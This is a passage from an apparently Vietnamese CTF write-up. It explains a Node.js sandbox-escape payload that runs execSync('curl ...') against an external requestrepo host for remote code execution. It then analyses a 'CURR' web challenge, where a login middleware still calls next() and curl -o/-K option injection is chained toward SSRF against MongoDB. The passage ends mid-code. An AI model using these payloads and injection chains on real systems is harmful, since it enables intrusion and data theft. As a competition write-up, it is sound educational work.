</pre></td><td class="rouge-code"><pre><span class="nx">toString</span><span class="p">.</span><span class="kd">constructor</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toString</span><span class="o">=</span><span class="nx">toString</span><span class="p">.</span><span class="kd">constructor</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">call</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">a</span><span class="o">=</span><span class="p">[</span><span class="dl">"</span><span class="s2">process.mainModule.require('child_process').execSync('curl http://yh9wz5br.requestrepo.com')</span><span class="dl">"</span><span class="p">];</span>
<span class="nx">a</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="dl">"</span><span class="s2">x</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">b</span><span class="o">=</span><span class="p">{};</span>
<span class="nx">b</span><span class="p">[</span><span class="nb">Symbol</span><span class="p">.</span><span class="nx">hasInstance</span><span class="p">]</span><span class="o">=</span><span class="nx">a</span><span class="p">.</span><span class="nx">sort</span><span class="p">;</span>
<span class="nx">b</span><span class="p">[</span><span class="dl">"</span><span class="s2">__proto__</span><span class="dl">"</span><span class="p">]</span><span class="o">=</span><span class="nx">a</span><span class="p">;</span>
<span class="nx">toString</span><span class="p">.</span><span class="kd">constructor</span> <span class="k">instanceof</span> <span class="nx">b</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Giải thích sơ qua về payload này</p>

<ul>
  <li>
    <p>Đầu tiên chúng ta sẽ gọi đến function <code class="language-plaintext highlighter-rouge">toString</code> và gán giá trị của function <code class="language-plaintext highlighter-rouge">call</code> cho nó</p>
  </li>
  <li>
    <p>Tiếp theo ta tạo một mảng a với giá trị đầu tiên là payload mà ta muốn execute (payload này sẽ được thực thi trong anonymous function)</p>
  </li>
  <li>
    <p>Tiếp theo ta gán giá trị <code class="language-plaintext highlighter-rouge">'x'</code> cho <code class="language-plaintext highlighter-rouge">a[1]</code> (sẽ giải thích ở bên dưới vì sao có phần này)</p>
  </li>
  <li>
    <p>Sau đó tạo một object b với key là <code class="language-plaintext highlighter-rouge">Symbol.hasInstance</code> và value là <code class="language-plaintext highlighter-rouge">a.sort</code></p>
  </li>
  <li>
    <p>Sau đó set <code class="language-plaintext highlighter-rouge">__proto__</code> của b là a</p>
  </li>
  <li>
    <p>Cuối cùng là kiểm tra xem toString.constructor có phải là instance của b (thật ra đoạn này không hẳn là kiểm tra mà là điều kiện để RCE)</p>
  </li>
</ul>

<p>Trước khi đi vào phần phân tích sâu hơn, mình sẽ giải thích về cách của instanceof hoạt động</p>

<p>Syntax</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nx">object</span> <span class="k">instanceof</span> <span class="kd">constructor</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Toán tử <code class="language-plaintext highlighter-rouge">instanceof</code> là toán tử dùng để kiểm tra xem một đối tượng có thuộc lớp nào đó hay không</p>

<p>Ví dụ đơn giản như sau</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="kd">class</span> <span class="nc">BOX</span> <span class="p">{}</span>
<span class="kd">let</span> <span class="nx">DI</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BOX</span><span class="p">();</span>

<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">DI</span> <span class="k">instanceof</span> <span class="nx">BOX</span><span class="p">);</span> <span class="c1">//true</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Ngoài ra nếu <code class="language-plaintext highlighter-rouge">constructor</code> (phần bên phải của <code class="language-plaintext highlighter-rouge">instanceof</code>) có phương thức <code class="language-plaintext highlighter-rouge">Symbol.hasInstance</code> thì nó sẽ được ưu tiên gọi, với <code class="language-plaintext highlighter-rouge">object</code> (phần bên trái của <code class="language-plaintext highlighter-rouge">instanceof</code>) là tham số truyền vào còn bên phải là <code class="language-plaintext highlighter-rouge">this</code> sau đó dùng kết quả để trả về kết quả của <code class="language-plaintext highlighter-rouge">instanceof</code></p>

<p>Ví dụ 1:</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="nx">BOX</span> <span class="o">=</span> <span class="p">{[</span><span class="nb">Symbol</span><span class="p">.</span><span class="nx">hasInstance</span><span class="p">]:</span> <span class="p">(</span><span class="nx">dib</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="c1">// console.log(dib)</span>
    <span class="k">return</span> <span class="nx">dib</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">dib</span><span class="dl">'</span>
<span class="p">}};</span>

<span class="nx">DI</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">dib</span><span class="dl">'</span>

<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">DI</span> <span class="k">instanceof</span> <span class="nx">BOX</span><span class="p">);</span> <span class="c1">//true</span>

</pre></td></tr></tbody></table></code></div></div>

<p>Ví dụ 2:</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="nx">a</span> <span class="o">=</span> <span class="p">[</span><span class="dl">'</span><span class="s1">1</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">0</span><span class="dl">'</span><span class="p">]</span>
<span class="nx">a</span><span class="p">.</span><span class="nx">__proto__</span><span class="p">[</span><span class="dl">'</span><span class="s1">loG</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">triggered</span><span class="dl">"</span><span class="p">)</span>
<span class="p">}</span>
<span class="nx">BOX</span> <span class="o">=</span> <span class="p">{[</span><span class="nb">Symbol</span><span class="p">.</span><span class="nx">hasInstance</span><span class="p">]:</span> <span class="nx">a</span><span class="p">.</span><span class="nx">loG</span><span class="p">};</span>

<span class="nx">DI</span> <span class="o">=</span> <span class="nb">Function</span>

<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">DI</span> <span class="k">instanceof</span> <span class="nx">BOX</span><span class="p">);</span> <span class="c1">// "triggered"</span>
<span class="c1">// console.log(a)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Đến phần chính, đi sâu vào giải thích vì sao nó hoạt động</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nx">toString</span><span class="p">.</span><span class="kd">constructor</span> <span class="k">instanceof</span> <span class="nx">b</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Khi câu lệnh này được thực thi thì:</p>

<ul>
  <li>
    <p>Khi <code class="language-plaintext highlighter-rouge">instanceof</code> được sử dụng thì nó sẽ tìm kiếm xem b có thuộc tính <code class="language-plaintext highlighter-rouge">Symbol.hasInstance</code> không? Nếu có thì sẽ thực thi gọi tới <code class="language-plaintext highlighter-rouge">a.sort</code> là <code class="language-plaintext highlighter-rouge">this</code> và <code class="language-plaintext highlighter-rouge">toString.constructor</code> (AKA <code class="language-plaintext highlighter-rouge">Function</code>) là tham số truyền vào</p>
  </li>
  <li>
    <p>Khi <code class="language-plaintext highlighter-rouge">a.sort</code>(function sort) được gọi đến thì bình thường  thì nó sẽ cố gắng chuyển tất cả các phần tử trong mảng thành string bằng hàm <code class="language-plaintext highlighter-rouge">toString()</code> rồi so sánh bằng <code class="language-plaintext highlighter-rouge">function</code> truyền vào. Điều này vô tình trigger hàm <code class="language-plaintext highlighter-rouge">call()</code> chúng ta đã đổi ở lúc đầu và bây giờ cả <code class="language-plaintext highlighter-rouge">array</code> sẽ trở thành <code class="language-plaintext highlighter-rouge">parameter</code> của <code class="language-plaintext highlighter-rouge">new Function</code></p>
  </li>
  <li>
    <p>Nói thêm ở phần này về lý do phải set <code class="language-plaintext highlighter-rouge">b[__proto__]=a</code> là vì <code class="language-plaintext highlighter-rouge">sort</code> là <code class="language-plaintext highlighter-rouge">function</code> của <code class="language-plaintext highlighter-rouge">array</code> nên chúng ta phải đổi <code class="language-plaintext highlighter-rouge">prototype</code> của nó thành <code class="language-plaintext highlighter-rouge">array</code> thì sort mới có thể được thực thi và hơn hết khi đó <code class="language-plaintext highlighter-rouge">sort</code> sẽ được thực thi trên <code class="language-plaintext highlighter-rouge">b</code>, <code class="language-plaintext highlighter-rouge">b</code> lúc này là một <code class="language-plaintext highlighter-rouge">object</code> nên <code class="language-plaintext highlighter-rouge">sort</code> sẽ cố gắng tìm kiếm <code class="language-plaintext highlighter-rouge">array</code> trong <code class="language-plaintext highlighter-rouge">object</code> này bằng cách tìm kiếm trong <code class="language-plaintext highlighter-rouge">prototype</code> của nó khi đó nó sẽ tìm được 1 <code class="language-plaintext highlighter-rouge">array</code> trong vì ta set <code class="language-plaintext highlighter-rouge">prototype</code> của <code class="language-plaintext highlighter-rouge">b</code> là <code class="language-plaintext highlighter-rouge">a</code></p>
  </li>
  <li>
    <p>Giá trị return của <code class="language-plaintext highlighter-rouge">new Function</code> này sẽ là một anonymous với <code class="language-plaintext highlighter-rouge">a[0]</code> là function và <code class="language-plaintext highlighter-rouge">a[1]</code> là parameter</p>
  </li>
</ul>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="p">(</span><span class="kd">function</span> <span class="nf">anonymous</span><span class="p">(</span><span class="nx">x</span>
<span class="p">)</span> <span class="p">{</span>
<span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">child_process</span><span class="dl">'</span><span class="p">).</span><span class="nf">execSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">curl http://yh9wz5br.requestrepo.com</span><span class="dl">'</span><span class="p">)</span>
<span class="p">})</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>Để nói thêm một chút nữa thì flow của chương trình sẽ như sau trigger <code class="language-plaintext highlighter-rouge">sort</code> -&gt; <code class="language-plaintext highlighter-rouge">sort</code> nhận <code class="language-plaintext highlighter-rouge">Function</code> làm tham số -&gt; <code class="language-plaintext highlighter-rouge">Function</code> là hàm được sử dụng để ‘so sánh’ các phần tử bên trong mảng -&gt; Mỗi phần từ được chuyển qua string(trigger <code class="language-plaintext highlighter-rouge">call</code> function) -&gt; Trả về một anonymouse function -&gt; Cuối cùng giá trị sau khi ‘so sánh’ sẽ được trả về dưới dạng string (trigger <code class="language-plaintext highlighter-rouge">call</code> function)</li>
</ul>

<p>Đây là code mô phỏng lại quá trình sort</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nx">toString</span><span class="p">.</span><span class="kd">constructor</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toString</span><span class="o">=</span><span class="nb">Function</span><span class="p">.</span><span class="nx">call</span><span class="p">;</span>

<span class="nc">Function</span><span class="p">(</span><span class="nx">a</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">toString</span><span class="p">(),</span><span class="nx">a</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">toString</span><span class="p">()).</span><span class="nf">toString</span><span class="p">();</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Từ đó ta RCE và lấy được flag</p>

<p><strong><code class="language-plaintext highlighter-rouge">Flag: W1{hehehe}</code></strong></p>

<p><code class="language-plaintext highlighter-rouge">P/S:</code> thật ra cách này đúng là “dùng dao mổ trâu để giết gà” vì cách này dùng cho những bài với filter chặt và bị hạn chế nhiều thứ. Do mình có sử dụng cách này khi thi nên tiện thể phân tích luôn cách này</p>

<h2 id="curr"><span class="me-2">CURR</span><a href="#curr" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>Let explore my website!!!

Author: dcthinh

http://45.122.249.68:20014

</pre></td></tr></tbody></table></code></div></div>

<p>Tóm tắt về source code của trang web này</p>

<p>App này có 3 route ,/ , /api/login và /api/curr và mình sẽ tập trung vào route /api/curr</p>

<p>Route này có chức năng là dùng lệnh curl với các options như là -d, …, và có một cái middleware là /api/login 
để kiểm tra login</p>

<p>Users và Flag được lưu trong mongoDB và đọc code một lúc thì không có cách nào để login hay bypass login cả</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">crypto</span><span class="dl">"</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nf">getSiblingDB</span><span class="p">(</span><span class="dl">'</span><span class="s1">app</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">users</span><span class="p">.</span><span class="nf">insertOne</span><span class="p">({</span> <span class="na">user</span><span class="p">:</span> <span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span><span class="p">,</span> <span class="na">pass</span><span class="p">:</span> <span class="nx">crypto</span><span class="p">.</span><span class="nf">randomBytes</span><span class="p">(</span><span class="mi">64</span><span class="p">).</span><span class="nf">toString</span><span class="p">(</span><span class="dl">"</span><span class="s2">hex</span><span class="dl">"</span><span class="p">)</span> <span class="p">});</span>

<span class="kd">const</span> <span class="nx">secret</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nf">getSiblingDB</span><span class="p">(</span><span class="dl">'</span><span class="s1">secret</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">secret</span><span class="p">.</span><span class="nx">flag</span><span class="p">.</span><span class="nf">insertOne</span><span class="p">({</span> <span class="na">flag</span><span class="p">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span> <span class="o">||</span> <span class="dl">"</span><span class="s2">W1{REACTED}</span><span class="dl">"</span> <span class="p">});</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Nhưng nhìn kỉ lại midleware thì mình thấy một điều khá là lạ</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">requiresLogin</span> <span class="o">=</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">res</span><span class="p">.</span><span class="nf">redirect</span><span class="p">(</span><span class="dl">"</span><span class="s2">/?error=login first</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nf">next</span><span class="p">();</span>
<span class="p">};</span>

</pre></td></tr></tbody></table></code></div></div>

<p>Vì sao lại có <code class="language-plaintext highlighter-rouge">next();</code> ở dưới cùng của middleware này, mình nghĩ là có vẻ như là dù không có login nhưng vẫn có thể đi tới endpoint sau chăng ?</p>

<p>Và đúng là thế, nó sẽ chạy phần code phía sau nhưng mà chúng ta không thể thấy phần output thôi</p>

<p><a href="/assets/wannagame/4.png" class="popup img-link  shimmer"><img src="/assets/wannagame/4.png" alt="alt text" loading="lazy"></a>
<a href="/assets/wannagame/5.png" class="popup img-link  shimmer"><img src="/assets/wannagame/5.png" alt="alt text" loading="lazy"></a></p>

<p>Đến phần <code class="language-plaintext highlighter-rouge">/api/curr</code></p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre><span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/api/curr</span><span class="dl">"</span><span class="p">,</span> <span class="nx">requiresLogin</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="p">{</span> <span class="nx">url</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">url</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">url</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">string</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span> <span class="na">success</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">message</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid URL</span><span class="dl">"</span> <span class="p">});</span>
    <span class="p">}</span>

    <span class="k">try</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nx">parsed</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URL</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
        <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="p">[</span><span class="dl">"</span><span class="s2">http:</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">https:</span><span class="dl">"</span><span class="p">].</span><span class="nf">includes</span><span class="p">(</span><span class="nx">parsed</span><span class="p">.</span><span class="nx">protocol</span><span class="p">))</span> <span class="k">throw</span> <span class="k">new</span> <span class="nc">Error</span><span class="p">(</span><span class="dl">"</span><span class="s2">Invalid URL</span><span class="dl">"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">catch </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span> <span class="na">success</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">message</span><span class="p">:</span> <span class="nx">e</span><span class="p">.</span><span class="nx">message</span> <span class="p">});</span>
    <span class="p">}</span>

    <span class="kd">const</span> <span class="nx">args</span> <span class="o">=</span> <span class="p">[</span> <span class="nx">url</span> <span class="p">];</span>
    <span class="kd">let</span> <span class="p">{</span> <span class="nx">opt</span><span class="p">,</span> <span class="nx">data</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">opt</span> <span class="o">&amp;&amp;</span> <span class="nx">data</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nx">opt</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">string</span><span class="dl">"</span> <span class="o">&amp;&amp;</span> <span class="k">typeof</span> <span class="nx">data</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">string</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="sr">/^-</span><span class="se">[</span><span class="sr">A-Za-z</span><span class="se">]</span><span class="sr">$/</span><span class="p">.</span><span class="nf">test</span><span class="p">(</span><span class="nx">opt</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span> <span class="na">success</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">message</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Invalid option</span><span class="dl">"</span> <span class="p">});</span>
        <span class="p">}</span>

        <span class="c1">// check method</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">opt</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">-d</span><span class="dl">"</span> <span class="o">||</span> <span class="p">[</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">].</span><span class="nf">includes</span><span class="p">(</span><span class="nx">data</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">args</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">opt</span><span class="p">,</span> <span class="nx">data</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="nx">cp</span><span class="p">.</span><span class="nf">spawn</span><span class="p">(</span><span class="dl">'</span><span class="s1">curl</span><span class="dl">'</span><span class="p">,</span> <span class="nx">args</span><span class="p">,</span> <span class="p">{</span> <span class="na">timeout</span><span class="p">:</span> <span class="mi">2000</span><span class="p">,</span> <span class="na">cwd</span><span class="p">:</span> <span class="dl">"</span><span class="s2">/tmp</span><span class="dl">"</span> <span class="p">}).</span><span class="nf">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">close</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">code</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="c1">// save result to database</span>
        <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span> <span class="na">success</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">message</span><span class="p">:</span> <span class="s2">`The site is </span><span class="p">${</span><span class="nx">code</span> <span class="o">===</span> <span class="mi">0</span> <span class="p">?</span> <span class="dl">'</span><span class="s1">up</span><span class="dl">'</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">down</span><span class="dl">'</span><span class="p">}</span><span class="s2">`</span> <span class="p">});</span>
    <span class="p">});</span>
<span class="p">});</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Phần này sẽ lấy URL của chúng ta và kiểm tra nó sau đó kiểm tra phần <code class="language-plaintext highlighter-rouge">opt</code> nếu nó qua được phần kiểm tra thì sẽ thực thi lệnh curr với các options mà ta thêm vào</p>

<p>Phần kiểm tra opt khá là <code class="language-plaintext highlighter-rouge">chặt</code>. Đầu tiên kiểm tra xem opt có bắt đầu bằng - và sau đó 1 là 1 ký tự [a-zA-Z] không, tiếp sau đó kiểm tra opt một là <code class="language-plaintext highlighter-rouge">-d</code> và là data hay là 1 option bất kỳ và có data là GET, hoặc là POST.</p>

<p>Và curl có hỗ trợ một options là -K (–config) option này giúp cho lệnh curl của chúng ta đọc từ một file text và sử dụng nó làm các options. Từ đó suy ra nếu mà có cách nào đó để chúng ta download file options của chúng ta về server và bắt server curl với options đó ta có thể curl tới bất kỳ URL nào</p>

<p>Để thử thì đây là options thử nghiệm</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>--url "http://XXXXXX.requestrepo.com"
user-agent = "yuu"
</pre></td></tr></tbody></table></code></div></div>

<p>Ta có thể setup một python http server và expose bằng ngrok để và dùng curl để download file bằng cách sau</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>url =xxxxx.NGROK.com/options.txt&amp;opt=-o&amp;data=GET
</pre></td></tr></tbody></table></code></div></div>

<p>Tiếp tục ta thử xem liệu nó có request đến server của mình với useragent là yuu không</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>url =xxxxxx.webhook.com&amp;opt=-K&amp;data=GET
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/wannagame/7.png" class="popup img-link  shimmer"><img src="/assets/wannagame/7.png" alt="alt text" loading="lazy"></a></p>

<p>Vậy là có thể gửi tới bất kỳ url nào với bất kỳ options nào mà ta muốn</p>

<p>Vậy với những thứ này thì làm sao lấy flag từ mongoDB đây? MongoDB giao tiếp thông qua MongoDB Wire Protocol. Người dùng có thể giao tiếp với database server thông qua TCP/IP. Vậy chúng ta có thể dùng gopher để và dùng curl để connect tới database server và lấy flag, nhưng tiếc là chúng ta không thể dùng gopher vì author đã set up như bên dưới</p>

<p><a href="/assets/wannagame/6.png" class="popup img-link  shimmer"><img src="/assets/wannagame/6.png" alt="alt text" loading="lazy"></a></p>

<p>Nhưng mà vẫn có một số protocol khác như telnet khi mà chúng cũng giao tiếp bằng TCP</p>

<p>Vậy ta có thể gửi một binary file(TCP transfer - file này chứa một giao tiếp lấy flag) cho mongo database server để server trả cái flag về</p>

<p>Ta có thể bắt file này bằng cách tạo một file để giả lập việc lấy flag và sử dụng tcpdump để bắt gói tin đó</p>

<p><a href="/assets/wannagame/8.png" class="popup img-link  shimmer"><img src="/assets/wannagame/8.png" alt="alt text" loading="lazy"></a></p>

<p>File js dùng để lấy flag</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="kd">const</span>  <span class="p">{</span> <span class="nx">MongoClient</span> <span class="p">}</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span> <span class="dl">"</span><span class="s2">mongodb</span><span class="dl">"</span> <span class="p">);</span>
<span class="kd">const</span> <span class="nx">client</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MongoClient</span><span class="p">(</span> <span class="dl">"</span><span class="s2">mongodb://mongodb:27017/</span><span class="dl">"</span> <span class="p">);</span>
<span class="nx">client</span><span class="p">.</span><span class="nf">connect</span><span class="p">().</span><span class="nf">then</span><span class="p">(</span><span class="k">async </span><span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span> 
